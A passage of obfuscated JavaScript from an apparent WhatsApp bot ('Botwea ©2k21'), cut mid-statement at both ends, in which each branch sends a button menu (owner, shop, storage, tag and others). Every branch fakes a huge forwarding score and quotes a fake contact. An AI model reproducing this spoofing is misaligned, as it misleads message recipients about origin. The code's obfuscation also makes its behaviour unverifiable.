buttonsspsoos_=[_0x78c883,_0x3ec252],btnnpnooon_={'contentText':funmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1f7707(-0x1fc,0x460,0x24,0x2cd)+ini_mark[_0x1f7707(0x4d0,0x1d9,0x20e,0x134)]('@')[0x36*-0xa2+-0x6*0x2fe+0x3420],'buttons':buttonsspsoos_,'headerType':0x6,'locationMessage':bacotlujpuuoou_[_0x1f7707(-0x6ac,-0x324,-0x28a,0x19)]['locationMe'+'ssage']},_0x402f8b={};_0x402f8b['text']='hi',_0x402f8b[_0x1f7707(0x90d,0x2f4,0x50c,0x9c9)+'Score']=0x3b9aca00,_0x402f8b[_0x1f7707(-0x510,-0x1dd,-0x151,-0x2f0)+'d']=!![],_0x402f8b[_0x39f25f(0x25f,0x688,0xb34,0x2c6)+_0x39f25f(-0xd2,0x2c6,0x507,0x26b)]=!![],_0x402f8b['mentionedJ'+'id']=[ini_mark];const _0x1d6398={};_0x1d6398[_0x1f7707(-0x254,-0x504,-0x92,0x302)]='Botwea\x20©2k'+'21',_0x1d6398[_0x1f7707(0x875,0x731,0x52f,0x469)+'o']=_0x402f8b,_0x1d6398['quoted']=fkontak,_0x1d6398[_0x39f25f(0x950,0x688,0x5b2,0xb1f)+'ral']=!![],alpha[_0x39f25f(-0x121,-0x84,-0x20e,-0x1d2)+'e'](from,btnnpnooon_,MessageType['buttonsMes'+'sage'],_0x1d6398);}if(sub_yt_zeeone_ofc==_0x39f25f(-0x12b,0x16e,-0x209,0x4f1)){console[_0x39f25f(0x377,0x59f,0x1e7,0x661)](color(time,_0x39f25f(0xa87,0x6e1,0x265,0x535)),color(_0x39f25f(0x23b,0x371,-0xc9,0x571)+_0x39f25f(0x92e,0x581,0x9aa,0x306)+'nu'));const mediooanxnxxvx_=await alpha[_0x1f7707(-0x362,0x103,-0xd3,-0x222)+_0x1f7707(-0x664,-0x3ee,-0x23b,-0x21b)](from,pp_userz,MessageType['location'],{'thumbnail':pp_userz});let bacotlujpuuopou_=mediooanxnxxvx_[_0x39f25f(-0x3e6,-0xdc,0x334,0x1b4)][_0x1f7707(0x224,0x1f5,0x427,0x6da)+_0x1f7707(-0xb8,-0x1f8,0x9a,0x14c)]?mediooanxnxxvx_['message'][_0x39f25f(0x906,0x5d5,0x7d4,0x1bd)+_0x1f7707(0x2c6,-0x3cb,0x9a,0x456)]:mediooanxnxxvx_;const _0x3ec4de={};_0x3ec4de[_0x39f25f(-0x3b,0x0,-0x1bf,0xea)+'t']='⋮☰\x20BACK';const _0x334315={};_0x334315['buttonId']=_0x1f7707(0x8ad,0x55e,0x4c0,0x6b3),_0x334315['buttonText']=_0x3ec4de,_0x334315[_0x1f7707(0x2c4,0x36d,0x520,0x33c)]=0x1;const _0x31000c={};_0x31000c[_0x1f7707(0x2c6,-0x3d0,-0x1ae,-0x2c2)+'t']=_0x39f25f(0x5da,0x76b,0x38f,0x3c6);const _0x11deca={};_0x11deca[_0x1f7707(0xb8,0x70e,0x499,0x683)]=_0x39f25f(0x2c7,0x24d,0x4e6,0x37c),_0x11deca['buttonText']=_0x31000c,_0x11deca[_0x1f7707(0x7d5,0x6f7,0x520,0x600)]=0x1;const buttonsospsoos_=[_0x334315,_0x11deca],btnnpnouoon_={'contentText':makermenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x39f25f(0x52,0x1d2,0x479,0x1a8)+ini_mark[_0x39f25f(0x271,0x3bc,0x816,0x1ea)]('@')[-0x5c6*-0x1+-0x7f6*0x4+0x1a12*0x1],'buttons':buttonsospsoos_,'headerType':0x6,'locationMessage':bacotlujpuuopou_[_0x39f25f(-0x197,-0xdc,0x30e,0x2f0)][_0x39f25f(0x7,0x9c,0x3c1,0x452)+_0x1f7707(0x761,0x1a2,0x2f5,-0x86)]},_0x51b425={};_0x51b425[_0x39f25f(0x12f,0x3cc,0x306,0x407)]='hi',_0x51b425[_0x39f25f(0x9f1,0x6ba,0x692,0x75e)+_0x1f7707(0x436,-0xb8,0x0,-0x25d)]=0x3b9aca00,_0x51b425[_0x1f7707(-0x7,-0x166,-0x151,-0x240)+'d']=!![],_0x51b425['sendEpheme'+'ral']=!![],_0x51b425[_0x39f25f(0x66e,0x63f,0x884,0x27b)+'id']=[ini_mark];const _0x43d490={};_0x43d490['caption']=_0x1f7707(-0x1b6,-0xa2,-0xe5,-0x29c)+'21',_0x43d490[_0x1f7707(0x1d7,0x473,0x52f,0x6b1)+'o']=_0x51b425,_0x43d490[_0x39f25f(0x570,0x106,0x448,0x49c)]=fkontak,_0x43d490[_0x39f25f(0xacf,0x688,0xa90,0x5fa)+_0x1f7707(-0x31e,-0x39b,0x118,-0x131)]=!![],alpha['sendMessag'+'e'](from,btnnpnouoon_,MessageType['buttonsMes'+_0x1f7707(0x193,-0x58c,-0x23b,-0xc2)],_0x43d490);}if(sub_yt_zeeone_ofc==_0x1f7707(-0x3f9,-0x426,-0x189,-0x7d)){console[_0x39f25f(0x5dc,0x59f,0x357,0x4f3)](color(time,_0x1f7707(0x4e9,0x850,0x533,0x2be)),color(_0x39f25f(0x34e,0x371,0x3ff,0x35d)+'ge\x20otherme'+'nu'));const mediooanjxnxxvx_=await alpha['prepareMes'+_0x1f7707(0xd4,0x95,-0x23b,-0x3)](from,pp_userz,MessageType[_0x39f25f(0x303,0x4d5,0x83c,0x653)],{'thumbnail':pp_userz});let bacotlujpuuuopou_=mediooanjxnxxvx_[_0x1f7707(-0x322,-0x35f,-0x28a,-0x735)][_0x1f7707(0x607,0x7fc,0x427,0x693)+_0x1f7707(0x47c,0xa5,0x9a,-0x296)]?mediooanjxnxxvx_['message'][_0x1f7707(0x397,0x3db,0x427,0x5d9)+_0x1f7707(-0x2b5,-0x203,0x9a,-0x3c5)]:mediooanjxnxxvx_;const _0x43e57a={};_0x43e57a[_0x39f25f(0x59,0x0,0x378,0x2ea)+'t']='⋮☰\x20BACK';const _0x4194fb={};_0x4194fb[_0x39f25f(0xa9e,0x647,0x369,0x6d1)]=_0x39f25f(0xb09,0x66e,0x303,0x1d9),_0x4194fb[_0x39f25f(0x799,0x37c,0xcb,0x115)]=_0x43e57a,_0x4194fb[_0x1f7707(0x6f8,0x32e,0x520,0x4e8)]=0x1;const _0x19caca={};_0x19caca[_0x39f25f(0x238,0x0,0xf2,-0x269)+'t']=_0x1f7707(0x88d,0x4db,0x5bd,0x45d);const _0x4bd8cf={};_0x4bd8cf['buttonId']=_0x39f25f(0x123,0x24d,0x54e,0x193),_0x4bd8cf[_0x1f7707(0x159,0xae,0x1ce,0x458)]=_0x19caca,_0x4bd8cf[_0x1f7707(0x8d5,0x389,0x520,0x7f5)]=0x1;const buttonsospsooos_=[_0x4194fb,_0x4bd8cf],btnnpnoukoon_={'contentText':othermenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1f7707(0xde,-0x10a,0x24,0x150)+ini_mark[_0x1f7707(0x582,0x187,0x20e,-0x106)]('@')[0xd5b+0x42*0x80+-0x2e5b],'buttons':buttonsospsooos_,'headerType':0x6,'locationMessage':bacotlujpuuuopou_[_0x1f7707(-0x2b1,-0x1a9,-0x28a,-0x6b2)][_0x39f25f(0x525,0x9c,0x3ff,-0x2fc)+'ssage']},_0x1cc4d8={};_0x1cc4d8['text']='hi',_0x1cc4d8['forwarding'+_0x39f25f(-0x23a,0x1ae,0x4c7,0xbb)]=0x3b9aca00,_0x1cc4d8[_0x1f7707(-0x3c0,-0x2bf,-0x151,-0xd7)+'d']=!![],_0x1cc4d8['sendEpheme'+'ral']=!![],_0x1cc4d8['mentionedJ'+'id']=[ini_mark];const _0x122f08={};_0x122f08[_0x39f25f(0x377,0x11c,0x100,0x201)]=_0x39f25f(-0x1b0,0xc9,0x4db,0x116)+'21',_0x122f08[_0x1f7707(0x750,0x8b8,0x52f,0x554)+'o']=_0x1cc4d8,_0x122f08[_0x39f25f(0x3d6,0x106,-0xf9,-0x32b)]=fkontak,_0x122f08[_0x39f25f(0xb27,0x688,0x833,0x428)+_0x1f7707(0x3ce,-0x38e,0x118,0x1c5)]=!![],alpha[_0x1f7707(0x1c,-0x644,-0x232,-0x156)+'e'](from,btnnpnoukoon_,MessageType[_0x39f25f(0x3b3,0x213,-0x177,0x67e)+_0x1f7707(-0x31c,-0x3a6,-0x23b,-0x16d)],_0x122f08);}if(sub_yt_zeeone_ofc==_0x1f7707(0x5d0,0x61d,0x5dd,0x382)){console[_0x1f7707(-0x5c,0x6c,0x3f1,0x704)](color(time,'magenta'),color('List\x20messa'+_0x39f25f(0x60b,0x491,0x8a0,0x227)+'nu'));const mediooanjxnxxovx_=await alpha['prepareMes'+'sage'](from,pp_userz,MessageType[_0x39f25f(0x79b,0x4d5,0x5f6,0x259)],{'thumbnail':pp_userz});let bacotlujpuuuopiou_=mediooanjxnxxovx_[_0x39f25f(0x11b,-0xdc,-0x100,-0x10)][_0x1f7707(0x41f,0x84c,0x427,-0x6e)+_0x1f7707(-0x3ea,-0x138,0x9a,-0x421)]?mediooanjxnxxovx_[_0x1f7707(-0x4b7,0x18a,-0x28a,-0x2b0)][_0x39f25f(0x8fd,0x5d5,0x1c1,0x605)+_0x39f25f(0x89,0x248,-0xc5,0x1e4)]:mediooanjxnxxovx_;const _0x40b5f7={};_0x40b5f7[_0x39f25f(-0x388,0x0,-0x3eb,0x1e3)+'t']='⋮☰\x20BACK';const _0x39fc96={};_0x39fc96[_0x39f25f(0x1d6,0x647,0x70b,0x25e)]='Command',_0x39fc96['buttonText']=_0x40b5f7,_0x39fc96[_0x39f25f(0x2d8,0x6ce,0xb28,0x9c6)]=0x1;const _0x50d3ee={};_0x50d3ee['displayTex'+'t']=_0x39f25f(0x736,0x76b,0x713,0x572);const _0x129de1={};_0x129de1[_0x1f7707(0x7e7,0x744,0x499,0x1ac)]=_0x1f7707(-0x1e9,0x2b1,0x9f,0x406),_0x129de1[_0x1f7707(0x3d9,0x9,0x1ce,0x48b)]=_0x50d3ee,_0x129de1[_0x1f7707(0x72c,0x550,0x520,0x4fa)]=0x1;const buttonusospsooos_=[_0x39fc96,_0x129de1],btnnpnoukooon_={'contentText':ownermenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark['split']('@')[-0x6b6*-0x1+0x1*-0x15eb+-0x11*-0xe5],'buttons':buttonusospsooos_,'headerType':0x6,'locationMessage':bacotlujpuuuopiou_['message']['locationMe'+_0x1f7707(0x3e5,0x638,0x2f5,0x65a)]},_0x3d6930={};_0x3d6930[_0x39f25f(0x307,0x3cc,0xda,0x26d)]='hi',_0x3d6930[_0x39f25f(0x338,0x6ba,0xb1c,0x42e)+'Score']=0x3b9aca00,_0x3d6930[_0x39f25f(0x511,0x5d,0x492,0x26d)+'d']=!![],_0x3d6930[_0x1f7707(0xc4,0x469,0x4da,0x350)+_0x1f7707(0x577,0x5ae,0x118,-0x2b7)]=!![],_0x3d6930[_0x39f25f(0x2e2,0x63f,0x291,0x9b0)+'id']=[ini_mark];const _0x9a27ce={};_0x9a27ce[_0x39f25f(-0x21a,0x11c,-0x26e,0x8f)]=_0x1f7707(-0x1fa,-0x137,-0xe5,-0x3d)+'21',_0x9a27ce[_0x39f25f(0x9fc,0x6dd,0x6ad,0xb8d)+'o']=_0x3d6930,_0x9a27ce['quoted']=fkontak,_0x9a27ce['sendEpheme'+_0x39f25f(0x3c8,0x2c6,0x408,-0x17b)]=!![],alpha[_0x39f25f(-0x3d5,-0x84,-0x46f,-0x172)+'e'](from,btnnpnoukooon_,MessageType['buttonsMes'+_0x39f25f(-0xb4,-0x8d,-0x51b,-0x3a9)],_0x9a27ce);}if(sub_yt_zeeone_ofc=='storagemen'+'u'){console[_0x1f7707(0x3b6,0x788,0x3f1,0x731)](color(time,_0x39f25f(0x489,0x6e1,0x27b,0x3a7)),color('List\x20messa'+_0x1f7707(0x2f1,-0x3ef,-0x77,-0x2bf)+_0x39f25f(0x566,0x28d,0x172,-0x1ca)));const mediooanjxnxixovx_=await alpha[_0x39f25f(0x349,0xdb,0x351,0x310)+'sage'](from,pp_userz,MessageType[_0x1f7707(0x697,0x71a,0x327,0x1bb)],{'thumbnail':pp_userz});let baocotlujpuuuopiou_=mediooanjxnxixovx_[_0x1f7707(-0x34b,-0x72d,-0x28a,-0x171)][_0x39f25f(0x27b,0x5d5,0x9e6,0x630)+_0x39f25f(0x2f,0x248,0x65f,-0x26)]?mediooanjxnxixovx_['message']['ephemeralM'+_0x1f7707(0x437,0x225,0x9a,-0xcb)]:mediooanjxnxixovx_;const _0x329874={};_0x329874[_0x39f25f(-0x85,0x0,0x3e4,0x36e)+'t']=_0x39f25f(-0x1d1,-0x8a,-0x304,-0x4cb);const _0xdc52df={};_0xdc52df[_0x1f7707(0x2c4,0x58c,0x499,0x761)]=_0x1f7707(0x8f,0x275,0x4c0,0x52a),_0xdc52df['buttonText']=_0x329874,_0xdc52df['type']=0x1;const _0x64421b={};_0x64421b[_0x39f25f(0x11a,0x0,0x2d5,-0x3e2)+'t']=_0x1f7707(0x9c3,0xa35,0x5bd,0x277);const _0x557319={};_0x557319[_0x39f25f(0x3aa,0x647,0x9fe,0x706)]=_0x1f7707(-0x2f6,-0x300,0x9f,-0x1c5),_0x557319['buttonText']=_0x64421b,_0x557319[_0x1f7707(0x6ad,0x897,0x520,0x4e2)]=0x1;const buttonusosipspooos_=[_0xdc52df,_0x557319],btnnpnoukoookn_={'contentText':storagemenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x39f25f(-0xe2,0x1d2,0x385,0x2eb)+ini_mark[_0x39f25f(0x81f,0x3bc,0x625,0x7b2)]('@')[0x775*0x1+-0x63*-0xc+-0xc19],'buttons':buttonusosipspooos_,'headerType':0x6,'locationMessage':baocotlujpuuuopiou_[_0x39f25f(-0x506,-0xdc,-0x245,-0x38a)][_0x39f25f(-0xe4,0x9c,0x4d1,-0x23)+'ssage']},_0x34835c={};_0x34835c[_0x1f7707(0x54a,0x37,0x21e,0x61c)]='hi',_0x34835c[_0x1f7707(0x689,0x700,0x50c,0x6c)+_0x39f25f(-0x295,0x1ae,-0x7d,0x53f)]=0x3b9aca00,_0x34835c['isForwarde'+'d']=!![],_0x34835c[_0x39f25f(0x7ac,0x688,0x8d6,0x9fb)+'ral']=!![],_0x34835c[_0x39f25f(0x3ca,0x63f,0x7c2,0x9d3)+'id']=[ini_mark];const _0x327c1d={};_0x327c1d[_0x1f7707(-0x386,-0x32d,-0x92,-0x38d)]='Botwea\x20©2k'+'21',_0x327c1d[_0x1f7707(0x48e,0x334,0x52f,0x7d0)+'o']=_0x34835c,_0x327c1d[_0x39f25f(0x547,0x106,0x525,0x73)]=fkontak,_0x327c1d[_0x1f7707(0x311,0x2dc,0x4da,0x554)+_0x1f7707(-0xe0,0x151,0x118,0x496)]=!![],alpha['sendMessag'+'e'](from,btnnpnoukoookn_,MessageType[_0x1f7707(0xfe,-0x414,0x65,-0x26f)+_0x1f7707(0x70,-0x2d3,-0x23b,-0x5c5)],_0x327c1d);}if(sub_yt_zeeone_ofc==_0x1f7707(0x261,0x6dd,0x66d,0x1c1)){console[_0x39f25f(0x7ca,0x59f,0x79b,0x313)](color(time,_0x39f25f(0x5c3,0x6e1,0x55f,0x555)),color(_0x39f25f(0x48b,0x371,-0xa0,-0xda)+_0x1f7707(0x1f9,0x594,0x3d0,0x321)));const mediooaonjxnxixovx_=await alpha[_0x39f25f(0x62,0xdb,0x336,0x250)+'sage'](from,pp_userz,MessageType[_0x39f25f(0x24d,0x4d5,0x812,0x7ca)],{'thumbnail':pp_userz});let baocotlujpuuuoopiou_=mediooaonjxnxixovx_[_0x1f7707(-0x2dc,-0x3f1,-0x28a,-0x49d)][_0x39f25f(0x257,0x5d5,0x79e,0x916)+_0x1f7707(0xd3,0x2bb,0x9a,0x221)]?mediooaonjxnxixovx_['message'][_0x1f7707(0x485,0xe4,0x427,0x792)+_0x1f7707(-0x3e1,0x1c7,0x9a,0x4ea)]:mediooaonjxnxixovx_;const _0x253a41={};_0x253a41[_0x1f7707(-0x55d,-0xde,-0x1ae,0xcd)+'t']=_0x39f25f(0x269,-0x8a,0x51,-0x14);const _0x45938a={};_0x45938a[_0x1f7707(0x74,0x1c9,0x499,0x4ce)]='Command',_0x45938a['buttonText']=_0x253a41,_0x45938a[_0x39f25f(0x5c8,0x6ce,0x878,0x40d)]=0x1;const _0x2ffac0={};_0x2ffac0[_0x1f7707(-0x32e,-0x44,-0x1ae,-0xe5)+'t']='✓\x20OWNER';const _0x43cb05={};_0x43cb05[_0x39f25f(0x9ad,0x647,0x1bb,0x4b0)]=_0x1f7707(0x2b4,-0x2b6,0x9f,0x221),_0x43cb05[_0x1f7707(-0xcc,0x4d5,0x1ce,0x23a)]=_0x2ffac0,_0x43cb05[_0x39f25f(0x6e0,0x6ce,0x4e4,0x822)]=0x1;const buttonusosipspiooos_=[_0x45938a,_0x43cb05],btnnpnoukoookkn_={'contentText':tagmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x39f25f(-0x2b9,0x1d2,0x242,0x685)+ini_mark[_0x1f7707(0x26d,0x35a,0x20e,0x4f)]('@')[-0x1df9+0x90e+0x14eb],'buttons':buttonusosipspiooos_,'headerType':0x6,'locationMessage':baocotlujpuuuoopiou_[_0x1f7707(-0x2a2,-0x4b2,-0x28a,-0x226)]['locationMe'+_0x39f25f(0x49d,0x4a3,0x89a,0x343)]},_0xc37f22={};_0xc37f22[_0x39f25f(-0x5b,0x3cc,0x288,0x6b5)]='hi',_0xc37f22[_0x1f7707(0x31e,0x6d,0x50c,0x3f6)+_0x39f25f(0x457,0x1ae,0xd7,0x3ac)]=0x3b9aca00,_0xc37f22[_0x39f25f(0x224,0x5d,-0x441,0x135)+'d']=!![],_0xc37f22[_0x39f25f(0x98f,0x688,0x4cc,0x24d)+_0x39f25f(0x696,0x2c6,0x387,0x5f6)]=!![],_0xc37f22[_0x39f25f(0x6d6,0x63f,0x86b,0x6c9)+'id']=[ini_mark];const _0x34e116={};_0x34e116[_0x39f25f(0x32,0x11c,0x1c3,-0x2df)]=_0x1f7707(0x3c,-0x4da,-0xe5,-0xc6)+'21',_0x34e116['contextInf'+'o']=_0xc37f22,_0x34e116['quoted']=fkontak,_0x34e116[_0x39f25f(0x5ac,0x688,0x716,0x527)+_0x1f7707(0x1a8,-0x1aa,0x118,0xd0)]=!![],alpha['sendMessag'+'e'](from,btnnpnoukoookkn_,MessageType['buttonsMes'+'sage'],_0x34e116);}if(sub_yt_zeeone_ofc==_0x1f7707(0x457,0x3e8,0x6c,0x236)){console[_0x1f7707(0x34e,0x211,0x3f1,0x572)](color(time,_0x39f25f(0xa3a,0x6e1,0xb72,0x31d)),color('List\x20messa'+_0x1f7707(0x335,0x528,0x216,-0x261)));const moediooaonjxnxixovx_=await alpha['prepareMes'+_0x1f7707(-0x571,0x1bd,-0x23b,-0x6d7)](from,pp_userz,MessageType[_0x1f7707(0x2de,0x292,0x327,0x3ba)],{'thumbnail':pp_userz});let baocotlujpuuukoopiou_=moediooaonjxnxixovx_[_0x1f7707(-0x4c,-0x1ca,-0x28a,-0x62c)][_0x39f25f(0x8d7,0x5d5,0x503,0x77f)+_0x1f7707(-0x3cc,-0x31b,0x9a,-0x244)]?moediooaonjxnxixovx_[_0x39f25f(-0x285,-0xdc,-0x244,-0x413)][_0x1f7707(0x5a9,0x5ac,0x427,0x21d)+_0x39f25f(0x45a,0x248,-0x1ce,0x51c)]:moediooaonjxnxixovx_;const _0x25a6c7={};_0x25a6c7[_0x1f7707(0x2d4,-0x547,-0x1ae,-0x2e0)+'t']=_0x1f7707(-0x678,-0x7,-0x238,0xfe);const _0x4c19d4={};_0x4c19d4['buttonId']=_0x1f7707(0x273,0x25d,0x4c0,0x977),_0x4c19d4[_0x1f7707(0xea,0x9b,0x1ce,-0x1b9)]=_0x25a6c7,_0x4c19d4[_0x39f25f(0xa04,0x6ce,0x708,0x7a5)]=0x1;const _0x508dd2={};_0x508dd2['displayTex'+'t']='✓\x20OWNER';const _0xdd532c={};_0xdd532c[_0x1f7707(0x6bc,0x738,0x499,0x91d)]='ownerku',_0xdd532c[_0x1f7707(0x4bb,0x9b,0x1ce,-0x292)]=_0x508dd2,_0xdd532c[_0x1f7707(0x29e,0x733,0x520,0x322)]=0x1;const buttonusosipspioooos_=[_0x4c19d4,_0xdd532c],btnnpnoukooiokkn_={'contentText':upmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x39f25f(0x5bd,0x1d2,0x5fb,0x413)+ini_mark[_0x1f7707(-0x238,0x2ed,0x20e,0x100)]('@')[-0x2*-0x376+0x3a5+-0x1*0xa91],'buttons':buttonusosipspioooos_,'headerType':0x6,'locationMessage':baocotlujpuuukoopiou_[_0x1f7707(-0x40d,-0x242,-0x28a,0x62)][_0x39f25f(0x448,0x9c,-0x293,0x80)+_0x1f7707(-0x52,0xfe,0x2f5,0x667)]},_0x3b4d6f={};_0x3b4d6f[_0x1f7707(0x2b2,0x139,0x21e,-0x26a)]='hi',_0x3b4d6f[_0x1f7707(0x7a8,0x8ea,0x50c,0x988)+_0x1f7707(-0x187,0x16,0x0,0x346)]=0x3b9aca00,_0x3b4d6f[_0x1f7707(-0x5e6,-0x3e6,-0x151,-0x33d)+'d']=!![],_0x3b4d6f[_0x39f25f(0x269,0x688,0x5ca,0x744)+_0x1f7707(0x121,0x3a2,0x118,-0xe8)]=!![],_0x3b4d6f[_0x39f25f(0x1bd,0x63f,0x1ed,0x4c0)+'id']=[ini_mark];const _0x347477={};_0x347477['caption']=_0x1f7707(-0x283,0x3,-0xe5,0x38c)+'21',_0x347477['contextInf'+'o']=_0x3b4d6f,_0x347477[_0x39f25f(0x52,0x106,-0x168,0x96)]=fkontak,_0x347477[_0x39f25f(0x931,0x688,0x69c,0x9f1)+'ral']=!![],alpha['sendMessag'+'e'](from,btnnpnoukooiokkn_,MessageType[_0x39f25f(0x8,0x213,0x1a7,0x587)+_0x1f7707(0x199,-0x33b,-0x23b,0x224)],_0x347477);}if(sub_yt_zeeone_ofc==_0x1f7707(-0x6f,0x1c,0x28b,0x110)+'r\x20cmd'){console['log'](color(time,_0x39f25f(0x4ef,0x6e1,0x9ee,0x3f4)),color(_0x1f7707(0x27a,0x309,0x1c3,0xca)+_0x39f25f(0x1d9,0x3de,0x803,-0x4)+_0x39f25f(-0x405,-0xb1,-0x3ce,-0x183)));const moedioooaonjxnxixovx_=await alpha['prepareMes'+_0x39f25f(-0x193,-0x8d,0x2de,0x21e)](from,pp_userz,MessageType[_0x39f25f(0x1db,0x4d5,0x90a,0x272)],{'thumbnail':pp_userz});let baocotlujpuiuukoopiou_=moedioooaonjxnxixovx_[_0x39f25f(-0x2ac,-0xdc,0x3b,-0x586)][_0x39f25f(0x5cb,0x5d5,0x381,0x419)+_0x39f25f(0x657,0x248,-0x273,-0xdc)]?moedioooaonjxnxixovx_[_0x39f25f(-0x1b0,-0xdc,0x36c,0x28d)][_0x1f7707(0x5a0,0x47e,0x427,0x4e1)+_0x39f25f(0x673,0x248,-0x4e,-0x13f)]:moedioooaonjxnxixovx_;const _0x538267={};_0x538267[_0x1f7707(0x8a,-0x429,-0x1ae,-0x667)+'t']=_0x39f25f(0x373,-0x8a,-0x2c7,-0x51e);const _0x574d6c={};_0x574d6c[_0x1f7707(0x7fa,0x6a1,0x499,0x892)]=_0x39f25f(0x83b,0x66e,0x2df,0x304),_0x574d6c[_0x39f25f(0x659,0x37c,0x127,0xfb)]=_0x538267,_0x574d6c[_0x1f7707(0x7ad,0x693,0x520,0x5b0)]=0x1;const _0x397809={};_0x397809[_0x39f25f(0x4ac,0x0,0x388,-0x1b9)+'t']='✓\x20OWNER';const _0xecc436={};_0xecc436[_0x39f25f(0x472,0x647,0x4e8,0x41c)]=_0x39f25f(0x550,0x24d,0x605,0x17d),_0xecc436[_0x1f7707(0x178,0x2b1,0x1ce,0x417)]=_0x397809,_0xecc436[_0x39f25f(0x822,0x6ce,0x620,0x7b7)]=0x1;const buttonusosipspiioooos_=[_0x574d6c,_0xecc436],btnnpnoukoooiokkn_={'contentText':set_stc_cmd(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1f7707(-0x343,-0x2ee,0x24,0x49d)+ini_mark['split']('@')[-0x3*-0x199+-0xa*-0x1b7+-0x89*0x29],'buttons':buttonusosipspiioooos_,'headerType':0x6,'locationMessage':baocotlujpuiuukoopiou_[_0x1f7707(-0x51b,-0x402,-0x28a,0x1ad)]['locationMe'+_0x39f25f(0x8a0,0x4a3,0x53e,0x1d6)]},_0x331e05={};_0x331e05[_0x39f25f(0x68f,0x3cc,0x37,0x134)]='hi',_0x331e05['forwarding'+'Score']=0x3b9aca00,_0x331e05['isForwarde'+'d']=!![],_0x331e05[_0x1f7707(0x2be,0x355,0x4da,0x946)+_0x39f25f(0x721,0x2c6,0x1e7,0x444)]=!![],_0x331e05['mentionedJ'+'id']=[ini_mark];const _0x8f5b54={};_0x8f5b54['caption']='Botwea\x20©2k'+'21',_0x8f5b54['contextInf'+'o']=_0x331e05,_0x8f5b54[_0x39f25f(0x588,0x106,-0xca,-0x185)]=fkontak,_0x8f5b54[_0x39f25f(0x9bc,0x688,0x27d,0x321)+_0x1f7707(0x1b8,0x19b,0x118,-0x300)]=!![],alpha[_0x1f7707(-0x1ac,-0x613,-0x232,-0x4a7)+'e'](from,btnnpnoukoooiokkn_,MessageType['buttonsMes'+_0x1f7707(-0x4a1,-0x43e,-0x23b,-0x32)],_0x8f5b54);}if(sub_yt_zeeone_ofc=='shopmenu'){console[_0x1f7707(0x112,0x45d,0x3f1,0x43)](color(time,_0x1f7707(0x942,0x70b,0x533,0x983)),color(_0x1f7707(-0x2ac,0x4c0,0x1c3,-0x1c0)+_0x39f25f(0x74,0x41c,0x4f2,0x2b8)+'u'));const moedioooaonjxnxixovxo_=await alpha[_0x1f7707(0x3,-0x3c2,-0xd3,0x38b)+'sage'](from,pp_userz,MessageType['location'],{'thumbnail':pp_userz});let baocotlujpuiuukooopiou_=moedioooaonjxnxixovxo_[_0x1f7707(-0x12a,-0x29,-0x28a,0x1e6)]['ephemeralM'+_0x39f25f(0x6be,0x248,0x549,0x1ba)]?moedioooaonjxnxixovxo_[_0x39f25f(-0x157,-0xdc,0xc6,-0x58a)][_0x1f7707(0x156,0x453,0x427,0x76a)+_0x39f25f(-0x10a,0x248,-0xf4,0x5aa)]:moedioooaonjxnxixovxo_;const _0x69ed3={};_0x69ed3[_0x39f25f(-0x38c,0x0,-0x384,-0x249)+'t']=_0x1f7707(-0x69d,0x168,-0x238,0xb0);const _0x1d8565={};_0x1d8565[_0x1f7707(0x3f4,0x503,0x499,0x2d3)]=_0x39f25f(0x48f,0x66e,0x61b,0x7c4),_0x1d8565['buttonText']=_0x69ed3,_0x1d8565['type']=0x1;const _0x5bba3b={};_0x5bba3b['displayTex'+'t']=_0x1f7707(0x8b4,0x438,0x5bd,0x93c);const _0x34e576={};_0x34e576['buttonId']=_0x39f25f(-0x21a,0x24d,-0xf6,-0x24d),_0x34e576['buttonText']=_0x5bba3b,_0x34e576[_0x39f25f(0x523,0x6ce,0x2f7,0x2f4)]=0x1;const buttonusosipspiioooos_=[_0x1d8565,_0x34e576],btnnponoukoooiokkn_={'contentText':shopmenu(prefix),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x1f7707(0x676,0x14c,0x20e,-0x163)]('@')[0x289+-0x1cfe+0x1a75],'buttons':buttonusosipspiioooos_,'headerType':0x6,'locationMessage':baocotlujpuiuukooopiou_['message'][_0x1f7707(-0x104,-0x1d0,-0x112,-0x2d5)+_0x1f7707(0x44f,0x637,0x2f5,0x2fb)]},_0x7d283b={};_0x7d283b[_0x39f25f(0x1d2,0x3cc,-0x8c,0x12d)]='hi',_0x7d283b[_0x39f25f(0x6e3,0x6ba,0x6a4,0x5b6)+_0x39f25f(0x3e1,0x1ae,0x2c5,0x3e4)]=0x3b9aca00,_0x7d283b[_0x1f7707(0x25d,-0xa3,-0x151,-0x353)+'d']=!![],_0x7d283b[_0x1f7707(0x8bc,0x762,0x4da,0x924)+'ral']=!![],_0x7d283b[_0x39f25f(0x778,0x63f,0x3b6,0x2d5)+'id']=[ini_mark];const _0x5cfe54={};_0x5cfe54[_0x39f25f(0x595,0x11c,0xe8,0x16c)]=_0x39f25f(0x1a1,0xc9,0x171,0x296)+'21',_0x5cfe54[_0x1f7707(0x5f7,0x567,0x52f,0x5bb)+'o']=_0x7d283b,_0x5cfe54[_0x1f7707(-0x1a4,0x255,-0xa8,-0x9e)]=fkontak,_0x5cfe54[_0x39f25f(0x6a1,0x688,0x8a5,0x6b4)+_0x39f25f(0x4ca,0x2c6,0x5f8,0x772)]=!![],alpha[_0x39f25f(0xf,-0x84,-0x45d,-0x53b)+'e'](from,btnnponoukoooiokkn_,MessageType['buttonsMes'+_0x39f25f(0x41a,-0x8d,0x26f,-0x501)],_0x5cfe54);}if(sub_yt_zeeone_ofc=='gacha\x20ceca'+'n'){console[_0x39f25f(0x4fb,0x59f,0x98b,0x549)](color(time,_0x1f7707(0x29e,0xd9,0x533,0x6b6)),color(_0x39f25f(0x4aa,0x371,0x318,0x16d)+_0x39f25f(-0xa4,0x302,0x56d,0x652)+'ecan'));const moediooioaonjxnxixovx_=await alpha['prepareMes'+_0x39f25f(0x240,-0x8d,-0x354,-0x228)](from,pp_userz,MessageType[_0x1f7707(0x1d6,0x4f9,0x327,0x783)],{'thumbnail':pp_userz});let 